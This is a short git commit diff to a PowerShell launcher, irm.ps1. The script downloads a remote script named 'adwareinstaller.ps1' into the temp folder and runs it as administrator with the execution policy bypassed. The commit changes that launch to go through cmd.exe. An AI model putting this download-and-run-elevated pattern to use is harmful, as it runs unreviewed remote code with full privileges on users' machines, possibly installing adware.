b202c940040933be00debbae067eff0cc4da92a0
kaipicalt <tomberthault20@gmail.com>
2024-06-10 22:53:30 +0200

    made irm launch more beautiful ✨

--- irm.ps1
+++ irm.ps1
@@ -3,6 +3,5 @@ $tempScriptPath = "$env:TEMP\adwareinstaller.ps1"
 
 Invoke-RestMethod -Uri $scriptUrl -OutFile $tempScriptPath
 
-Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tempScriptPath`" -FromIRM" -Verb RunAs
-
+Start-Process cmd.exe -ArgumentList "/c powershell -NoProfile -ExecutionPolicy Bypass -File `"$tempScriptPath`" -FromIRM" -Verb RunAs
 exit
